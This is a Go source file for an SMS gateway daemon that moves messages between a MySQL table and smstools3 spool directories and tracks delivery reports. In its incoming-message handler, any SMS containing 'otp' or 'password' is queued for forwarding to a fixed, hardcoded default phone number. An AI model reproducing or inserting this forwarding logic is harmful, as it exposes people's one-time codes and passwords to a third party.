package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Config struct {
	DBUser      string
	DBPass      string
	DBHost      string
	DBPort      string
	DBName      string
	PollDelay   time.Duration
	OutDir      string
	IncomingDir string
	ForwardTo   string
}

func loadConfig() Config {
	cfg := Config{
		DBUser:      getenv("SMS_DB_USER", "sms_user"),
		DBPass:      getenv("SMS_DB_PASS", "sms_pass"),
		DBHost:      getenv("SMS_DB_HOST", "127.0.0.1"),
		DBPort:      getenv("SMS_DB_PORT", "3306"),
		DBName:      getenv("SMS_DB_NAME", "sms_db"),
		PollDelay:   time.Second * 2,
		OutDir:      getenv("SMS_OUT_DIR", "/var/spool/sms/outgoing"),
		IncomingDir: getenv("SMS_IN_DIR", "/var/spool/sms/incoming"),
		ForwardTo:   getenv("SMS_FORWARD_NO", "9595313000"),
	}
	return cfg
}

func getenv(key, def string) string {
	val := os.Getenv(key)
	if val == "" {
		return def
	}
	return val
}

// create smstools3 spool file for one SMS
func writeSpoolFile(cfg Config, id int64, receiver, text string) error {
	if err := os.MkdirAll(cfg.OutDir, 0770); err != nil {
		return fmt.Errorf("mkdir OutDir: %w", err)
	}

	filename := fmt.Sprintf("%s/gosms_%d_%d.sms", cfg.OutDir, id, time.Now().UnixNano())

	f, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("create spool file: %w", err)
	}
	defer f.Close()

	// content := fmt.Sprintf("To: %s\n\n%s\n", receiver, text)
	content := fmt.Sprintf("To: %s\nAlphabet: UTF-8\n\n%s\n", receiver, text)

	if _, err := f.WriteString(content); err != nil {
		return fmt.Errorf("write spool file: %w", err)
	}

	log.Printf("Spool file created: %s", filename)
	return nil
}

// send pending SMS from DB -> outgoing dir
func processOutgoing(db *sql.DB, cfg Config) error {
	rows, err := db.Query(`
		SELECT id, phone, text
		FROM sms_messages
		WHERE status = 'Pending' AND direction = 'Outgoing'
		ORDER BY created_time ASC
		LIMIT 10
	`)
	if err != nil {
		return fmt.Errorf("query pending SMS: %w", err)
	}
	defer rows.Close()

	count := 0
	for rows.Next() {
		var id int64
		var receiver, text string
		if err := rows.Scan(&id, &receiver, &text); err != nil {
			return fmt.Errorf("scan pending SMS: %w", err)
		}

		log.Printf("Processing SMS id=%d phone=%s len=%d", id, receiver, len(text))

		if err := writeSpoolFile(cfg, id, receiver, text); err != nil {
			log.Printf("Error writing spool for id=%d: %v", id, err)
			continue
		}

		if _, err := db.Exec(`UPDATE sms_messages SET status = 'Sending' WHERE id = ?`, id); err != nil {
			log.Printf("Update status error for id=%d: %v", id, err)
		}

		count++
	}
	if err := rows.Err(); err != nil {
		return fmt.Errorf("rows error: %w", err)
	}

	if count == 0 {
		// log.Println("No pending SMS.")
	}
	return nil
}

// read incoming files: normal SMS -> sms_messages, status report -> update sms_messages
func processIncoming(db *sql.DB, cfg Config) error {
	inDir := cfg.IncomingDir
	if inDir == "" {
		return nil
	}

	if err := os.MkdirAll(inDir, 0770); err != nil {
		return fmt.Errorf("mkdir IncomingDir: %w", err)
	}

	processedDir := filepath.Join(inDir, "processed")
	if err := os.MkdirAll(processedDir, 0770); err != nil {
		return fmt.Errorf("mkdir processed: %w", err)
	}

	convertTime := func(s string) *string {
		s = strings.TrimSpace(s)
		if len(s) < 17 {
			return nil
		}
		// "25-12-03 17:20:20" -> "2025-12-03 17:20:20"
		yy := s[0:2]
		mm := s[3:5]
		dd := s[6:8]
		timePart := s[9:]

		formatted := fmt.Sprintf("20%s-%s-%s %s", yy, mm, dd, timePart)
		return &formatted
	}

	entries, err := os.ReadDir(inDir)
	if err != nil {
		return fmt.Errorf("readdir incoming: %w", err)
	}

	for _, e := range entries {
		if e.IsDir() {
			continue
		}

		filename := e.Name()
		if strings.HasPrefix(filename, ".") {
			continue
		}

		path := filepath.Join(inDir, filename)
		data, err := os.ReadFile(path)
		if err != nil {
			log.Printf("Read ERR %s: %v", path, err)
			continue
		}

		text := string(data)

		// --- Status report file ---
		if strings.Contains(text, "SMS STATUS REPORT") {
			lines := strings.Split(text, "\n")

			var phone, statusLine, sentStr, recvStr, dischargeStr string

			for _, ln := range lines {
				l := strings.TrimSpace(ln)

				if strings.HasPrefix(l, "From:") {
					phone = strings.TrimSpace(strings.TrimPrefix(l, "From:"))
				}
				if strings.HasPrefix(l, "Sent:") {
					sentStr = strings.TrimSpace(strings.TrimPrefix(l, "Sent:"))
				}
				if strings.HasPrefix(l, "Discharge_timestamp:") {
					dischargeStr = strings.TrimSpace(strings.TrimPrefix(l, "Discharge_timestamp:"))
				}
				if strings.HasPrefix(l, "Received:") {
					recvStr = strings.TrimSpace(strings.TrimPrefix(l, "Received:"))
				}
				if strings.HasPrefix(l, "Status:") {
					statusLine = strings.TrimSpace(strings.TrimPrefix(l, "Status:"))
				}
			}

			newStatus := "Failed"

			switch {
			case strings.HasPrefix(statusLine, "0,"):
				newStatus = "Delivered"

			case strings.HasPrefix(statusLine, "1,"):
				newStatus = "Forwarded"

			case strings.HasPrefix(statusLine, "2,"):
				newStatus = "Delivered"

			case strings.HasPrefix(statusLine, "34,"):
				newStatus = "Retrying"

			case strings.HasPrefix(statusLine, "69,"):
				newStatus = "Failed"

			case strings.HasPrefix(statusLine, "70,"):
				newStatus = "Failed"

			case strings.HasPrefix(statusLine, "95,"):
				newStatus = "Failed"

			case strings.HasPrefix(statusLine, "97,"):
				newStatus = "Expired"
			}

			var sentVal, deliveredVal, reportVal interface{}

			if t := convertTime(sentStr); t != nil {
				sentVal = *t
			} else {
				sentVal = nil
			}

			if t := convertTime(dischargeStr); t != nil {
				deliveredVal = *t
			} else {
				deliveredVal = nil
			}

			if t := convertTime(recvStr); t != nil {
				reportVal = *t
			} else {
				reportVal = nil
			}

			res, err := db.Exec(`
				UPDATE sms_messages
				SET status = ?,
				    sent_time = IFNULL(sent_time, ?),
				    delivered_time = ?,
				    report_time = ?,
					 modem = 'GSM1'
				WHERE phone = ?
				  AND status = 'Sending'
				ORDER BY created_time DESC
				LIMIT 1`,
				newStatus, sentVal, deliveredVal, reportVal, phone,
			)
			if err != nil {
				log.Printf("DB update ERR phone=%s: %v", phone, err)
			} else {
				rows, _ := res.RowsAffected()
				if rows == 0 {
					log.Printf("DB update: NO RECORDS UPDATED for phone=%s (status was not 'Sending')", phone)
					_, err := db.Exec(`
						UPDATE sms_messages
						SET status = ?,
							delivered_time = ?,
							report_time = ?
						WHERE phone = ?
							AND sent_time = ?
						ORDER BY created_time DESC
						LIMIT 1`,
						newStatus, deliveredVal, reportVal, phone, sentVal,
					)
					if err != nil {
						log.Printf("DB update ERR phone=%s: %v", phone, err)
					} else {
						log.Printf("Updated retry sms_messages => %s | sent=%s | delivered=%s | report=%s",
							newStatus, sentStr, dischargeStr, recvStr)
					}
				} else {
					log.Printf("Updated sms_messages => %s | sent=%s | delivered=%s | report=%s",
						newStatus, sentStr, dischargeStr, recvStr)
				}
			}

		} else {
			// --- Normal incoming SMS ---
			lines := strings.Split(text, "\n")
			var sender, recvStr, sentStr, modem string

			for _, ln := range lines {
				l := strings.TrimSpace(ln)

				if strings.HasPrefix(l, "From:") {
					sender = strings.TrimSpace(strings.TrimPrefix(l, "From:"))
				}
				if strings.HasPrefix(l, "Received:") {
					recvStr = strings.TrimSpace(strings.TrimPrefix(l, "Received:"))
				}
				if strings.HasPrefix(l, "Sent:") {
					sentStr = strings.TrimSpace(strings.TrimPrefix(l, "Sent:"))
				}
				if strings.HasPrefix(l, "Modem:") {
					modem = strings.TrimSpace(strings.TrimPrefix(l, "Modem:"))
				}
			}

			// body = text after first blank line
			body := ""
			if parts := strings.SplitN(text, "\n\n", 2); len(parts) == 2 {
				body = strings.TrimSpace(parts[1])
			}

			var recvVal interface{}
			if t := convertTime(recvStr); t != nil {
				recvVal = *t
			} else {
				recvVal = nil
			}

			if sender != "" && body != "" {
				_, err = db.Exec(
					`INSERT INTO sms_messages(direction, phone, text, status, sent_time, delivered_time, report_time, modem)
					 VALUES('Incoming', ?, ?, 'Received', ?, ?, NOW(), ?)`,
					sender, body, sentStr, recvVal, modem,
				)
				if err != nil {
					log.Printf("DB insert sms_messages ERR: %v", err)
				} else {
					log.Printf("Inserted sms_messages from %s", sender)
				}

				// forward OTP / password messages to fixed number
				lcBody := strings.ToLower(body)
				if strings.Contains(lcBody, "otp") || strings.Contains(lcBody, "password") {
					forwardTo := cfg.ForwardTo

					if _, errOut := db.Exec(
						`INSERT INTO sms_messages(direction, phone, text, status, created_time)
							VALUES('Outgoing', ?, ?, 'Pending', NOW())`,
						forwardTo, body,
					); errOut != nil {
						log.Printf("sms_messages insert for OTP/password forward error: %v", errOut)
					} else {
						log.Printf("queued OTP/password message forward to %s", forwardTo)
					}
				}

			} else {
				log.Printf("Skip incoming file %s (missing sender/body)", filename)
			}
		}

		// move file to processed in all cases
		dst := filepath.Join(processedDir, filename)
		if err := os.Rename(path, dst); err != nil {
			log.Printf("Cannot move file %s -> %s: %v", path, dst, err)
		}
	}

	return nil
}

// delete old SMS files from sent/failed/processed folders
func cleanupOldFiles(cfg Config) {
	// keep only last 1 day
	threshold := time.Now().Add(-24 * time.Hour)

	// folders to clean
	dirs := []string{
		"/var/spool/sms/sent",
		"/var/spool/sms/failed",
		filepath.Join(cfg.IncomingDir, "processed"),
	}

	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			// directory may not exist, ignore
			continue
		}

		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			path := filepath.Join(dir, e.Name())

			info, err := e.Info()
			if err != nil {
				continue
			}

			if info.ModTime().Before(threshold) {
				if err := os.Remove(path); err != nil {
					log.Printf("cleanup: cannot delete %s: %v", path, err)
				} else {
					log.Printf("cleanup: deleted %s", path)
				}
			}
		}
	}
}

func main() {
	cfg := loadConfig()

	dsn := fmt.Sprintf("%s:%s@tcp(%s:%s)/%s?charset=utf8mb4&parseTime=true&loc=Local",
		cfg.DBUser, cfg.DBPass, cfg.DBHost, cfg.DBPort, cfg.DBName)

	db, err := sql.Open("mysql", dsn)
	if err != nil {
		log.Fatalf("DB open error: %v", err)
	}
	defer db.Close()

	if err := db.Ping(); err != nil {
		log.Fatalf("DB ping error: %v", err)
	}

	log.Println("Go SMS daemon started. DB connection OK.")
	log.Printf("Using outbox directory: %s", cfg.OutDir)
	log.Printf("Using incoming directory: %s", cfg.IncomingDir)
	lastCleanup := time.Now().Add(-25 * time.Hour) // force cleanup at first run

	for {
		if err := processOutgoing(db, cfg); err != nil {
			log.Printf("processOutgoing error: %v", err)
		}
		if err := processIncoming(db, cfg); err != nil {
			log.Printf("processIncoming error: %v", err)
		}
		// once per day cleanup
		if time.Since(lastCleanup) > 24*time.Hour {
			cleanupOldFiles(cfg)
			lastCleanup = time.Now()
		}

		time.Sleep(cfg.PollDelay)
	}
}
